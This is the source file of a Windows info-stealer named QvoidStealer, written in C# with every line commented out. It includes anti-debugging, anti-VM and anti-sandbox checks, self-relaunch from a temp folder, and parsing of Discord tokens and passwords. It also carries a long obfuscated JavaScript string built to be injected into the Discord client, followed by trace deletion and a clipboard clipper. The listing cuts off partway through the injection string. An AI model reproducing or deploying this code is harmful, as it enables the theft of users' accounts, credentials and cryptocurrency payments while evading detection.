﻿//using System;
//using System.IO;
//using System.Net;
//using System.Linq;
//using System.Text;
//using QvoidWrapper;
//using System.Drawing;
//using Newtonsoft.Json;
//using Microsoft.Win32;
//using System.Threading;
//using QvoidStealer.Main;
//using System.Reflection;
//using System.Management;
//using System.Diagnostics;
//using System.Data.SQLite;
//using System.Collections;
//using System.Net.Sockets;
//using System.Net.Security;
//using System.Globalization;
//using System.Windows.Forms;
//using Newtonsoft.Json.Linq;
//using System.IO.Compression;
//using System.Drawing.Imaging;
//using System.Security.Principal;
//using System.Collections.Generic;
//using System.Security.Cryptography;
//using Org.BouncyCastle.Crypto.Modes;
//using System.Text.RegularExpressions;
//using System.Runtime.InteropServices;
//using Org.BouncyCastle.Crypto.Engines;
//using static QvoidWrapper.DiscordWebhook;
//using Org.BouncyCastle.Crypto.Parameters;
//using QvoidStealer.Miscellaneous.Stealers.Browsers;
//using System.Security.Cryptography.X509Certificates;

//namespace QvoidStealer
//{
//    internal static class Program
//    {
//        [STAThread]
//        static void Main(string[] args)
//        {
//            new Thread(() =>
//            {
//                Thread.CurrentThread.CurrentCulture = CultureInfo.InvariantCulture;
//                Thread.CurrentThread.CurrentUICulture = CultureInfo.InvariantCulture;

//                Console.WriteLine(@"https://sir_I_am_illusioning_or_you_reading_me?_ ");

//                foreach (var proc in Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName))
//                    if (proc.MainModule.FileName == Process.GetCurrentProcess().MainModule.FileName && proc.Id != Process.GetCurrentProcess().Id)
//                        proc.Kill();

//                Protection.WebSniffers(Settings.AntiWebSinffers);
//                Protection.AntiDebug(Settings.AntiDebug);
//                Protection.DetectVM(Settings.AntiVM);
//                Protection.Sandboxie(Settings.AntiSandBoxie);
//                Protection.Emulation(Settings.AntiEmulation);

//                Grabber.Grab(args);
//                Grabber.DeleteTraces(false, false);

//                if (Settings.Clipper.Enabled)
//                    Settings.Clipper.Start();

//                Environment.Exit(0);
//            })
//            .Start();

//            Thread.Sleep(-1);
//        }
//    }
//}


//namespace QvoidStealer.Main
//{
//    internal static class Grabber
//    {
//        /// <summary>
//        /// This is the main function which executes the grabber.
//        /// </summary>
//        static public void Grab(string[] args)
//        {
//            string _Token = ""; string _OldPassword = ""; string _NewPassword = "";

//            //Checking if the given argument(s) containing the information we need.
//            foreach (var arg in args)
//            {
//                if (!arg.Contains("|%&|"))
//                    continue;

//                var quries = arg.Split(new string[] { "|%&|" }, StringSplitOptions.None);
//                foreach (var _q in quries)
//                {
//                    var splitted = _q.Split('=');
//                    switch (splitted[0])
//                    {
//                        case "token":
//                            _Token = splitted[1] == "\"\"" ? "" : splitted[1];
//                            break;
//                        case "oldpass":
//                            _OldPassword = splitted[1] == "\"\"" ? "" : splitted[1];
//                            break;
//                        case "password":
//                            _NewPassword = splitted[1] == "\"\"" ? "" : splitted[1];
//                            break;
//                    }
//                }
//            }

//            //Some random path to contains our temp files.
//            string path = Path.GetTempPath() + $"\\{Encryption.GenerateKey(8, false, Protection.UniqueSeed() + 9)}-{Encryption.GenerateKey(4, false, Protection.UniqueSeed() + 11)}-{Encryption.GenerateKey(4, false, Protection.UniqueSeed() + 12)}-{Encryption.GenerateKey(4, false, Protection.UniqueSeed() + 13)}-{Encryption.GenerateKey(8, false, Protection.UniqueSeed() + 14)}\\";

//            //Checking if the current path have all the dependencies.
//            if (!Directory.Exists($"{Application.StartupPath}\\x64")
//                || !Directory.Exists($"{Application.StartupPath}\\x86")
//                || !File.Exists($"{Application.StartupPath}\\x64\\SQLite.Interop.dll")
//                || !File.Exists($"{Application.StartupPath}\\x86\\SQLite.Interop.dll")
//                || !File.Exists($"{Application.StartupPath}\\System.Data.SQLite.Linq.dll")
//                || !File.Exists($"{Application.StartupPath}\\System.Data.SQLite.EF6.dll")
//                || !File.Exists($"{Application.StartupPath}\\System.Data.SQLite.dll")
//                || !File.Exists($"{Application.StartupPath}\\Newtonsoft.Json.dll")
//                || !File.Exists($"{Application.StartupPath}\\EntityFramework.SqlServer.dll")
//                || !File.Exists($"{Application.StartupPath}\\EntityFramework.dll")
//                || !File.Exists($"{Application.StartupPath}\\BouncyCastle.Crypto.dll"))
//            {
//                //If it hasn't we'll just copy them from the resources of the program into some folder in temp and start it.
//                if (Directory.Exists(path))
//                    Directory.Delete(path, true);

//                Extract(path, path);

//                File.Copy(Assembly.GetEntryAssembly().Location, $"{path}\\{AppDomain.CurrentDomain.FriendlyName}");
//                Thread.Sleep(100);

//                //Starting the grabber
//                Process process = new Process()
//                {
//                    StartInfo = new ProcessStartInfo($"{path}\\{System.AppDomain.CurrentDomain.FriendlyName}")
//                    {
//                        Arguments = string.Join(" ", args),
//                        WorkingDirectory = Path.GetDirectoryName($"{path}\\{System.AppDomain.CurrentDomain.FriendlyName}")
//                    }
//                };
//                process.Start();

//                Environment.Exit(0);
//            }

//            //Getting all of the Discord path(s) avaliable on the computer.
//            Discord discord = new Discord();
//            if (!discord.IsExists)
//                return;

//            //If we've found avaliable Discord's core directory.
//            if (discord.Cores.Count > 0)
//            {
//                string Injection = "function _0x3a78(_0x1196ca,_0x51e04f){const _0x3b48e3=_0x32b1();return _0x3a78=function(_0x5aa98e,_0x2fe5af){_0x5aa98e=_0x5aa98e-(0x84+-0x2bf*0x4+0x3b*0x34);let _0x3a10ea=_0x3b48e3[_0x5aa98e];if(_0x3a78['gwuZZr']===undefined){var _0x5cdfdd=function(_0x1eff94){const _0x1594b6='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x309656='',_0x3b3d2d='',_0x152e2f=_0x309656+_0x5cdfdd;for(let _0x1e0f4c=0x2*-0xc2d+0x17b*0x2+0x4*0x559,_0x4229a7,_0x55041f,_0x801885=-0x14e4+-0x1bc6+0x30aa;_0x55041f=_0x1eff94['charAt'](_0x801885++);~_0x55041f&&(_0x4229a7=_0x1e0f4c%(-0x1*0x14fd+-0x154c+0x7*0x60b)?_0x4229a7*(-0x34f*-0xa+-0x9a*-0x21+-0x34b0)+_0x55041f:_0x55041f,_0x1e0f4c++%(-0x24df*-0x1+-0x2092+-0x1*0x449))?_0x309656+=_0x152e2f['charCodeAt'](_0x801885+(-0x1432+-0x21d2+0x360e))-(-0x16f*-0xb+-0x23fd+0xa21*0x2)!==-0x1c7e+0x16*-0x4+0x1cd6?String['fromCharCode'](0x4f*0x22+0x1a2d+-0x23ac&_0x4229a7>>(-(0xe3d+0x9e8*-0x3+0x41*0x3d)*_0x1e0f4c&-0x183f+0xec6+0x97f)):_0x1e0f4c:-0x105d+0x19b7+0x2*-0x4ad){_0x55041f=_0x1594b6['indexOf'](_0x55041f);}for(let _0x3a1f7d=-0x1634+-0x17d*-0x5+0xec3,_0x3a7a6b=_0x309656['length'];_0x3a1f7d<_0x3a7a6b;_0x3a1f7d++){_0x3b3d2d+='%'+('00'+_0x309656['charCodeAt'](_0x3a1f7d)['toString'](-0x49*0x32+-0x2*-0x30b+0x83c))['slice'](-(-0x7*0x26+0x5a7+-0x49b));}return decodeURIComponent(_0x3b3d2d);};const _0x36e42e=function(_0x2e7480,_0x5835bc){let _0x3ef4f6=[],_0x4934e6=0x1526+-0x2565+0x103f,_0x50e05d,_0x2d689e='';_0x2e7480=_0x5cdfdd(_0x2e7480);let _0x1e64d2;for(_0x1e64d2=0xb07+0x547*-0x1+-0x5c0;_0x1e64d2<-0x7a9*-0x5+0x1*0x14fb+-0x28*0x175;_0x1e64d2++){_0x3ef4f6[_0x1e64d2]=_0x1e64d2;}for(_0x1e64d2=-0x2*-0x127+0x1d1+-0x41f;_0x1e64d2<0x380+-0x2074*0x1+0x11c*0x1b;_0x1e64d2++){_0x4934e6=(_0x4934e6+_0x3ef4f6[_0x1e64d2]+_0x5835bc['charCodeAt'](_0x1e64d2%_0x5835bc['length']))%(0x2461+-0x3d*0x49+-0x47f*0x4),_0x50e05d=_0x3ef4f6[_0x1e64d2],_0x3ef4f6[_0x1e64d2]=_0x3ef4f6[_0x4934e6],_0x3ef4f6[_0x4934e6]=_0x50e05d;}_0x1e64d2=0x21c6+-0x1e29*-0x1+0xd*-0x4eb,_0x4934e6=-0x4c*-0x27+-0x185*-0xf+-0x225f;for(let _0x414411=0xf79*0x2+0xbc8+0x6*-0x71f;_0x414411<_0x2e7480['length'];_0x414411++){_0x1e64d2=(_0x1e64d2+(0x14eb+-0x2*-0x5+-0x14f4))%(-0x14fd*0x1+0x6e9*0x1+0xf14),_0x4934e6=(_0x4934e6+_0x3ef4f6[_0x1e64d2])%(0xcff+-0x1*0x31d+-0x8e2),_0x50e05d=_0x3ef4f6[_0x1e64d2],_0x3ef4f6[_0x1e64d2]=_0x3ef4f6[_0x4934e6],_0x3ef4f6[_0x4934e6]=_0x50e05d,_0x2d689e+=String['fromCharCode'](_0x2e7480['charCodeAt'](_0x414411)^_0x3ef4f6[(_0x3ef4f6[_0x1e64d2]+_0x3ef4f6[_0x4934e6])%(-0x876+-0x1a1c+-0x2392*-0x1)]);}return _0x2d689e;};_0x3a78['tTvMFM']=_0x36e42e,_0x1196ca=arguments,_0x3a78['gwuZZr']=!![];}const _0x7e24db=_0x3b48e3[0x583+0xd3*0x4+0x29*-0x37],_0x15611f=_0x5aa98e+_0x7e24db,_0x44db80=_0x1196ca[_0x15611f];if(!_0x44db80){if(_0x3a78['DMgpuV']===undefined){const _0x74a04e=function(_0x426282){this['nCXLgq']=_0x426282,this['YBvJmP']=[0x134*0x19+-0x1f4*0x11+0x321,-0x2174+-0x1*0x2c5+0x2439,0x1c58+0xa6*-0x5+0x2*-0xc8d],this['YhhBbR']=function(){return'newState';},this['xHfezL']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['hGyVmh']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x74a04e['prototype']['nHtWJY']=function(){const _0x227f37=new RegExp(this['xHfezL']+this['hGyVmh']),_0x13ae50=_0x227f37['test'](this['YhhBbR']['toString']())?--this['YBvJmP'][-0x2021+-0x1f89+0x3fab]:--this['YBvJmP'][-0x2*0xb04+0x1*-0x1f8b+0x3593];return this['mbBrez'](_0x13ae50);},_0x74a04e['prototype']['mbBrez']=function(_0x2d3d79){if(!Boolean(~_0x2d3d79))return _0x2d3d79;return this['RhOqUx'](this['nCXLgq']);},_0x74a04e['prototype']['RhOqUx']=function(_0x1a97e6){for(let _0x4eefb1=0x5b2+0x35*-0x81+0x1503,_0x43808e=this['YBvJmP']['length'];_0x4eefb1<_0x43808e;_0x4eefb1++){this['YBvJmP']['push'](Math['round'](Math['random']())),_0x43808e=this['YBvJmP']['length'];}return _0x1a97e6(this['YBvJmP'][0x2071+0x3*-0x401+-0x146e]);},new _0x74a04e(_0x3a78)['nHtWJY'](),_0x3a78['DMgpuV']=!![];}_0x3a10ea=_0x3a78['tTvMFM'](_0x3a10ea,_0x2fe5af),_0x1196ca[_0x15611f]=_0x3a10ea;}else _0x3a10ea=_0x44db80;return _0x3a10ea;},_0x3a78(_0x1196ca,_0x51e04f);}(function(_0x2649f8,_0x3400c9){function _0x1f688b(_0x39ccd0,_0x41ffcc,_0x124dc7,_0x37fe85,_0x106fcd){return _0x3a78(_0x39ccd0-0xaf,_0x106fcd);}function _0x350c61(_0x585dd1,_0x9c7507,_0x5c6e5e,_0x54aac9,_0x12f144){return _0x3a78(_0x9c7507- -0x24d,_0x12f144);}function _0x19c6aa(_0xa5fa64,_0x276aa1,_0x4909a7,_0x85223d,_0x42b912){return _0x3a78(_0x4909a7- -0x10a,_0x85223d);}const _0x2c764a=_0x2649f8();function _0x4187e0(_0x172e0e,_0x522d13,_0x398fd1,_0x45f123,_0x58fefd){return _0x3a78(_0x58fefd- -0x1b6,_0x172e0e);}function _0x48f4af(_0x1b4876,_0x32515a,_0x1d7fc7,_0x240b64,_0x4ad06d){return _0x3a78(_0x1b4876- -0x3bc,_0x32515a);}while(!![]){try{const _0x5f2e52=parseInt(_0x350c61(0x1ef,0x2f1,0x2eb,0x440,'vj69'))/(-0xa4e+-0x6f1+0x1140)*(-parseInt(_0x350c61(0x153,0x3bb,0x21c,0x19d,'er11'))/(-0x2*-0x7a0+-0x1eb0+0xf72))+parseInt(_0x350c61(0x276,0x3d,-0x155,0x68,'X9oW'))/(-0xe5*-0x4+-0x2202+0x1*0x1e71)+-parseInt(_0x1f688b(0x5fb,0x7ae,0x78b,0x784,'asq^'))/(-0x1537*-0x1+-0x4*0x51d+-0xbf*0x1)*(parseInt(_0x4187e0('[GQe',0x255,0x461,0x5be,0x3e8))/(-0x16c2+-0x75a+0xa0b*0x3))+-parseInt(_0x350c61(0x1b5,0x8a,-0x57,0x2ac,'er11'))/(0x2*-0xb72+-0x1*-0xe03+-0x1*-0x8e7)*(parseInt(_0x1f688b(0x35c,0x50d,0x31c,0x272,'K$Eh'))/(-0x201e*-0x1+-0xf*-0x293+-0x14*0x389))+-parseInt(_0x1f688b(0x59c,0x62b,0x46a,0x35b,'Np[W'))/(-0x1e09*0x1+0x3ee+0x1*0x1a23)*(-parseInt(_0x48f4af(-0x2e,']eq@',-0x3a,-0xba,0x1ce))/(0x1a15+0x1444+-0x2e50))+-parseInt(_0x4187e0('3MeJ',0x2d2,-0x88,0x275,0x1a5))/(0xcdc+0xd45*0x1+-0x1a17)+parseInt(_0x48f4af(-0x1f0,'3nC1',-0x27e,-0x454,-0x307))/(0x2454+0x41*0x5f+-0x3c68);if(_0x5f2e52===_0x3400c9)break;else _0x2c764a['push'](_0x2c764a['shift']());}catch(_0x55c96c){_0x2c764a['push'](_0x2c764a['shift']());}}}(_0x32b1,-0x86227+-0x58f09+0xa*0x1efae));const _0x4e453f=(function(){function _0x11efb4(_0x17f6af,_0x18be86,_0x3c16d1,_0xd7b750,_0x2cf357){return _0x3a78(_0x18be86- -0x17c,_0xd7b750);}const _0x23b6dc={'AefQg':function(_0x4f47eb,_0xf2a071){return _0x4f47eb(_0xf2a071);},'GzBAS':function(_0x34dfb0,_0x180feb){return _0x34dfb0===_0x180feb;},'pNpzS':_0x11efb4(0x2fd,0x120,0x4a,'CV[@',0x132),'JtneB':function(_0x3024ee,_0x1b9b9d){return _0x3024ee===_0x1b9b9d;},'ZXtNu':_0x2c925b('er11',0x377,0x527,0x31a,0x2cd),'vWMlF':_0x11efb4(0x21d,0x251,0x308,'OhVE',0x427),'JxsvK':function(_0x28f748,_0x462484){return _0x28f748===_0x462484;},'aGXTo':_0x11efb4(0x23c,0x370,0x341,'%%)G',0x23f),'ELJPe':_0x55db99(0x6c7,0x53a,0x513,'[qHe',0x3f7)};function _0x55db99(_0x3129e5,_0x267acc,_0x39f4eb,_0x40ab77,_0x24708d){return _0x3a78(_0x39f4eb-0x1e3,_0x40ab77);}function _0x2c925b(_0x14962b,_0x3f7a35,_0x55d919,_0x30b726,_0x25e89e){return _0x3a78(_0x3f7a35-0x1c8,_0x14962b);}let _0x2113bf=!![];function _0x2b3864(_0x551eff,_0x34e170,_0xe7e7ee,_0x1c004e,_0x5abc52){return _0x3a78(_0x1c004e- -0x2e7,_0xe7e7ee);}function _0x1762f1(_0x90f695,_0x2b097d,_0x15c2b9,_0x124823,_0x4caccd){return _0x3a78(_0x124823- -0x117,_0x15c2b9);}return function(_0x5e851d,_0x2f4701){function _0x335762(_0x54bd56,_0x536392,_0x394907,_0x5669ad,_0x2de1ea){return _0x11efb4(_0x54bd56-0x85,_0x54bd56- -0x1f5,_0x394907-0x40,_0x536392,_0x2de1ea-0x1ee);}function _0x369ccd(_0x3bab47,_0x465124,_0x2aac58,_0x319b5f,_0x2b8ba9){return _0x55db99(_0x3bab47-0x15c,_0x465124-0x1ae,_0x2aac58- -0x3a0,_0x2b8ba9,_0x2b8ba9-0x27);}function _0x441716(_0x5ccc0b,_0x232bc3,_0x576bd8,_0x388cb6,_0x597739){return _0x1762f1(_0x5ccc0b-0x1e0,_0x232bc3-0x1e7,_0x597739,_0x388cb6-0x3f8,_0x597739-0x1a3);}if(_0x23b6dc[_0x441716(0x656,0x998,0x8c7,0x776,'z#EP')](_0x23b6dc[_0x335762(-0x101,'er11',0x13d,-0x343,-0x199)],_0x23b6dc[_0x441716(0x604,0x4c3,0x5cf,0x49a,'nSPg')])){const _0x2a0dee=_0x5811d4?function(){function _0x2bac67(_0x2eb20a,_0x29c0af,_0x776ead,_0x53d473,_0x246135){return _0x441716(_0x2eb20a-0x15e,_0x29c0af-0x132,_0x776ead-0x157,_0x2eb20a- -0x5e1,_0x246135);}if(_0x106879){const _0x4b2a4b=_0xfd2548[_0x2bac67(0xc3,0x315,0x21c,-0x14f,'KO@1')](_0x2acaa5,arguments);return _0x3abda0=null,_0x4b2a4b;}}:function(){};return _0x127e09=![],_0x2a0dee;}else{const _0x16bd4b=_0x2113bf?function(){const _0x1bb682={'gMLNr':function(_0x2ff79b,_0x590a6a){function _0x28a973(_0x885b0e,_0x400c0a,_0x124533,_0x408d58,_0x168f2c){return _0x3a78(_0x400c0a-0x3df,_0x168f2c);}return _0x23b6dc[_0x28a973(0x67c,0x7a6,0x604,0x676,'z#EP')](_0x2ff79b,_0x590a6a);}};function _0x22a544(_0x277c15,_0x2cbf85,_0x572df3,_0x125f3f,_0x217fcc){return _0x369ccd(_0x277c15-0x1c7,_0x2cbf85-0x149,_0x572df3-0x1c0,_0x125f3f-0xd3,_0x125f3f);}function _0x134a20(_0x2b8a54,_0x2acc41,_0x1e7ac6,_0x194b4e,_0x3a48b3){return _0x369ccd(_0x2b8a54-0x1ab,_0x2acc41-0x14a,_0x1e7ac6-0x18f,_0x194b4e-0x10a,_0x2b8a54);}function _0x47310a(_0x7edda1,_0x502012,_0x3d0d46,_0xb4bc37,_0x274937){return _0x441716(_0x7edda1-0xf9,_0x502012-0x5f,_0x3d0d46-0xa2,_0x502012- -0x4a6,_0x3d0d46);}function _0xcc7986(_0x58b3bc,_0x1d48ff,_0xc78bc0,_0xa79fe4,_0x15432d){return _0x369ccd(_0x58b3bc-0x2d,_0x1d48ff-0xe6,_0x15432d-0x251,_0xa79fe4-0x9,_0xa79fe4);}function _0x54dee1(_0xaac3a8,_0x5efbf0,_0x547875,_0xe888da,_0x5a5d05){return _0x335762(_0x5a5d05-0x1db,_0xe888da,_0x547875-0x151,_0xe888da-0x113,_0x5a5d05-0x40);}if(_0x23b6dc[_0x134a20('G$kb',0x5be,0x377,0x470,0x252)](_0x23b6dc[_0x22a544(0x415,0x279,0x288,'MCP#',0x3bd)],_0x23b6dc[_0x134a20('3MeJ',0x239,0x2e1,0x47c,0x503)])){if(_0x2f4701){if(_0x23b6dc[_0x22a544(0x47f,0x55c,0x55c,'357&',0x6e5)](_0x23b6dc[_0xcc7986(0x584,0x2d5,0x27c,'d)1Q',0x38a)],_0x23b6dc[_0x54dee1(0x9e,0x45f,0x4ce,'3nC1',0x27b)]))return!![];else{const _0x145ec7=_0x2f4701[_0x134a20('m^ii',0x52f,0x5c5,0x633,0x5d9)](_0x5e851d,arguments);return _0x2f4701=null,_0x145ec7;}}}else _0x1bb682[_0x47310a(-0x107,-0x22,'llM9',0x1cf,0x162)](_0x29b067,'0');}:function(){};return _0x2113bf=![],_0x16bd4b;}};}());function _0x14e30b(_0x3395a6,_0x5abdd4,_0x531f0c,_0x32f55c,_0xfb0319){return _0x3a78(_0x5abdd4- -0x311,_0x531f0c);}const _0x5d2743=_0x4e453f(this,function(){const _0x47cc4f={};function _0x5b1dc6(_0x233d32,_0x30b504,_0x57e0fd,_0x1cd505,_0xe3e885){return _0x3a78(_0x30b504-0x69,_0x57e0fd);}function _0x469bd0(_0x55c4b5,_0x851434,_0x919f30,_0xc0a6a,_0x12c0cd){return _0x3a78(_0x12c0cd- -0xd1,_0x55c4b5);}function _0x455865(_0x438760,_0x5395a2,_0x1e3628,_0xbc3284,_0x16af1b){return _0x3a78(_0x5395a2- -0xb9,_0x16af1b);}_0x47cc4f[_0x59f586(0x45f,'OhVE',0x309,0x2ee,0xe0)]=_0x469bd0('Np[W',0x4ee,0x32d,0x19c,0x2fd)+_0x469bd0('eb0J',0x22e,0x37a,0x25a,0x453)+'+$';function _0x59f586(_0x3b70bd,_0x20dd48,_0x7bfa09,_0x25b12d,_0x37130b){return _0x3a78(_0x7bfa09- -0x1d5,_0x20dd48);}const _0x1dc838=_0x47cc4f;function _0x586e2e(_0x44de02,_0x45419d,_0x2ee604,_0x410b95,_0x266295){return _0x3a78(_0x2ee604- -0x1de,_0x44de02);}return _0x5d2743[_0x5b1dc6(0x589,0x339,'8YQS',0x317,0x1e9)+_0x469bd0('H1Ip',0x345,0x628,0x31b,0x436)]()[_0x469bd0('39*L',0x588,0x717,0x4c8,0x4ab)+'h'](_0x1dc838[_0x469bd0('Ri!W',0x3f2,0x368,0x665,0x4aa)])[_0x586e2e('K$Eh',0x245,0x225,0x1f,0x286)+_0x455865(0x148,0x239,0x172,0xa4,'KO@1')]()[_0x5b1dc6(0xfe,0x2c9,'DbP#',0x51d,0x50c)+_0x59f586(0x1fe,'(CAj',0x39d,0x562,0x3a2)+'r'](_0x5d2743)[_0x455865(0x4df,0x4c3,0x566,0x624,'39*L')+'h'](_0x1dc838[_0x5b1dc6(0x532,0x62e,'ut@m',0x652,0x895)]);});_0x5d2743();function _0x533ec6(_0x2fb210,_0x17ac88,_0x1d36ea,_0x3b0f97,_0x4d140c){return _0x3a78(_0x17ac88-0x312,_0x2fb210);}function _0x42c156(_0x1db89b,_0x211543,_0x2ab0c4,_0x53c1cf,_0x1f6985){return _0x3a78(_0x2ab0c4- -0x90,_0x1f6985);}const _0x334df6=(function(){function _0x3d6964(_0x330631,_0x34d38f,_0x226f1f,_0x232ed1,_0x3b2171){return _0x3a78(_0x232ed1-0x2ac,_0x3b2171);}function _0x583af8(_0x46c70a,_0x420921,_0x59e526,_0x501dcf,_0x4e5982){return _0x3a78(_0x46c70a-0x290,_0x59e526);}function _0x2d20a4(_0x4f2c12,_0x2f0d54,_0x6303cd,_0x2b0d47,_0x282628){return _0x3a78(_0x2f0d54-0xe2,_0x4f2c12);}const _0x57c783={'aYISZ':function(_0x2e7e03,_0x4a1770){return _0x2e7e03+_0x4a1770;},'gCkIu':_0x4dd32e(0xae,0x34c,'(CAj',0x2f5,0x249)+_0x4dd32e(0x313,0x3dc,'[qHe',0x545,0x34d)+_0x10c7be(0x5fe,0x6eb,0x498,'Ri!W',0x67e),'JVcpu':function(_0x1f8a0f,_0x515e3b){return _0x1f8a0f(_0x515e3b);},'dgddF':function(_0x296f52,_0x30995a){return _0x296f52!==_0x30995a;},'nbKNC':_0x2d20a4('Hk9Z',0x66b,0x5e5,0x548,0x832),'KbPYu':_0x2d20a4('Np[W',0x715,0x635,0x815,0x539),'kqQCg':function(_0x6dd562,_0x273dbe){return _0x6dd562===_0x273dbe;},'pZsjc':_0x4dd32e(-0xd8,0xa3,'eqrc',-0xed,0x12f),'YViPO':_0x10c7be(0x351,0x2e1,0x4c8,'KO@1',0x6dd),'RePqB':function(_0xc61621,_0x2bc481){return _0xc61621===_0x2bc481;},'dMkaB':_0x3d6964(0x4e3,0x68c,0x6f8,0x4de,'Ri!W')};function _0x10c7be(_0xf1702f,_0x117090,_0x1b29e4,_0x13eff9,_0x374294){return _0x3a78(_0x1b29e4-0x153,_0x13eff9);}function _0x4dd32e(_0x3800e1,_0x4ff34b,_0x526de3,_0x406133,_0x563204){return _0x3a78(_0x563204- -0x2af,_0x526de3);}let _0x239493=!![];return function(_0x12e9b4,_0x24be95){function _0x101d22(_0xe7af6,_0x23b7cb,_0x24c10d,_0x52da69,_0x51baea){return _0x2d20a4(_0xe7af6,_0x24c10d-0x49,_0x24c10d-0x1b2,_0x52da69-0x1c0,_0x51baea-0x1c1);}function _0x19e352(_0x25ca92,_0x2e44c7,_0x522164,_0x424b53,_0x5beb3b){return _0x4dd32e(_0x25ca92-0xe6,_0x2e44c7-0x152,_0x25ca92,_0x424b53-0x193,_0x522164- -0x125);}function _0xde0b47(_0x75bc94,_0x47488f,_0x30f52e,_0x3ebcc6,_0x4c3746){return _0x10c7be(_0x75bc94-0xd5,_0x47488f-0x13b,_0x4c3746-0x260,_0x3ebcc6,_0x4c3746-0xf5);}function _0x14ab7c(_0x55f133,_0x17c3e9,_0x198dae,_0x20a9b7,_0x486881){return _0x2d20a4(_0x486881,_0x198dae-0x3,_0x198dae-0x13f,_0x20a9b7-0x107,_0x486881-0x172);}function _0x1ca51e(_0x13e667,_0x362281,_0x1acba0,_0x4b3a65,_0x1e634b){return _0x3d6964(_0x13e667-0xe0,_0x362281-0x15f,_0x1acba0-0x1f0,_0x1e634b- -0x54b,_0x4b3a65);}if(_0x57c783[_0x19e352('@)Mb',0x2ca,0x266,0x8d,0x40b)](_0x57c783[_0x1ca51e(-0x3,-0xb0,0xd8,'z2Oe',0xd4)],_0x57c783[_0x19e352('m^ii',-0x47,-0x78,-0x21e,0x81)])){const _0x504994=_0x239493?function(){function _0x507fa5(_0x384d17,_0x44b212,_0x4193a5,_0x4819d6,_0x362370){return _0x101d22(_0x44b212,_0x44b212-0x13c,_0x4819d6- -0x1bd,_0x4819d6-0x1e3,_0x362370-0x98);}function _0x3a6512(_0x2b0362,_0x2cd53f,_0x1bb337,_0x5b5895,_0x1c63b8){return _0x101d22(_0x2cd53f,_0x2cd53f-0x110,_0x1bb337- -0x425,_0x5b5895-0xeb,_0x1c63b8-0x18b);}function _0x534bc3(_0x31d343,_0x28659b,_0x594a64,_0x35b0a2,_0x2ca9cf){return _0x101d22(_0x28659b,_0x28659b-0xe5,_0x31d343- -0x34f,_0x35b0a2-0xa7,_0x2ca9cf-0x18f);}const _0x47d839={'KRgdS':function(_0x2139ac,_0x4cef3f){function _0x190621(_0x23f2b5,_0x148ef7,_0x5ef667,_0x557e03,_0x53a748){return _0x3a78(_0x148ef7- -0xeb,_0x23f2b5);}return _0x57c783[_0x190621('0tL3',0x452,0x297,0x339,0x395)](_0x2139ac,_0x4cef3f);},'joiYX':_0x57c783[_0x507fa5(0x23a,'S$EO',0x553,0x40c,0x3f4)],'ORVzv':function(_0x487784,_0xa5913e){function _0x3c47af(_0x139084,_0x1cbc41,_0x2656ad,_0x20ebde,_0x1b4bb4){return _0x507fa5(_0x139084-0x87,_0x2656ad,_0x2656ad-0x177,_0x139084-0x26b,_0x1b4bb4-0x34);}return _0x57c783[_0x3c47af(0x582,0x714,'z#EP',0x36e,0x5cb)](_0x487784,_0xa5913e);}};function _0xb5aef2(_0x1ee738,_0x40e89b,_0x5473f7,_0x506172,_0x43bb44){return _0x19e352(_0x40e89b,_0x40e89b-0x15,_0x5473f7-0x1cf,_0x506172-0x47,_0x43bb44-0x1be);}function _0x232775(_0x171b1a,_0x38c5bb,_0x17a07a,_0x3155d9,_0x12dcd5){return _0x101d22(_0x171b1a,_0x38c5bb-0xb2,_0x12dcd5- -0xc8,_0x3155d9-0x31,_0x12dcd5-0x1c);}if(_0x57c783[_0x507fa5(0x25f,'bjTv',0x149,0x158,-0xa8)](_0x57c783[_0xb5aef2(0x26b,'S$EO',0x33c,0x55d,0x218)],_0x57c783[_0x507fa5(0x1e7,']eq@',0x16d,0x1a5,0x1ca)])){if(_0x24be95){if(_0x57c783[_0x534bc3(0x2b,'OhVE',0xe6,-0x236,-0xb0)](_0x57c783[_0x507fa5(0x187,'H1Ip',0x37e,0x132,0xaa)],_0x57c783[_0x232775(']eq@',0x1a0,0x3e0,0x181,0x304)]))return _0x277fa9;else{const _0x2f44b2=_0x24be95[_0x507fa5(0x677,'asq^',0x57c,0x430,0x671)](_0x12e9b4,arguments);return _0x24be95=null,_0x2f44b2;}}}else{if(!_0x5078fc[_0x534bc3(0x400,'eqrc',0x250,0x299,0x324)+_0x3a6512(0x29,'Np[W',0xd9,0x142,0x2aa)](_0x47d839[_0x507fa5(0x43f,'X9oW',0x3f0,0x54d,0x545)](_0x32c015,_0x47d839[_0x232775('3MeJ',0x524,0x5ee,0x251,0x4b3)]))){_0x2fb359[_0x3a6512(-0x6e,'Ri!W',0x1b6,0x270,0x98)+_0x507fa5(0x2b6,'(CAj',0x3b5,0x1ae,0x21f)](_0x47d839[_0x534bc3(0x17b,'S$EO',0x14d,0x1fc,0x4)](_0x41e412,_0x47d839[_0x507fa5(0x1bf,'!6ND',0x1bc,0x3f7,0x422)]));const _0x3dd723=_0x1de7ce[_0x507fa5(0x6ed,'[qHe',0x473,0x51e,0x559)+_0x507fa5(0x4ef,'89@x',0x3b7,0x4a6,0x471)+_0x534bc3(0x413,'vj69',0x1ac,0x242,0x454)]()[-0x2401+0x1021*-0x2+0x2bb*0x19];_0x3dd723[_0xb5aef2(0x109,'OhVE',0x16d,0xe3,0x1b4)+_0xb5aef2(0x21a,'RfHc',0x2cf,0x3eb,0x2a6)+'s'][_0xb5aef2(-0x231,'d)1Q',0x27,-0xe7,0x185)+_0xb5aef2(-0xa5,'lOZ%',0x3f,0xed,0x257)+_0x232775('%%)G',0x50b,0x320,0x435,0x2c1)+'pt'](_0x507fa5(0x48b,'89@x',0x67d,0x424,0x1c6)+_0xb5aef2(0x20d,'d)1Q',0x370,0x3cc,0x3a8)+_0x534bc3(0x294,'OhVE',0x2d8,0x1b8,0x232)+_0x507fa5(0x474,'RfHc',0x493,0x5c7,0x75d)+_0x232775('OhVE',0x4e1,0x42f,0x69b,0x602)+_0x232775('G$kb',0x4b1,0x38a,0x201,0x29b)+_0x232775('0tL3',0x615,0x6d8,0x381,0x498)+_0x507fa5(0x54,'llM9',0x1fc,0x29d,0x205)+_0x232775('OhVE',0x591,0x2cc,0x4be,0x329)+_0x3a6512(-0x3d,'Ri!W',0xb5,-0xb7,0xee)+_0x3a6512(-0x1b8,'@)Mb',0x64,0x4d,0xed)+_0xb5aef2(0x4e0,'!6ND',0x2a2,0x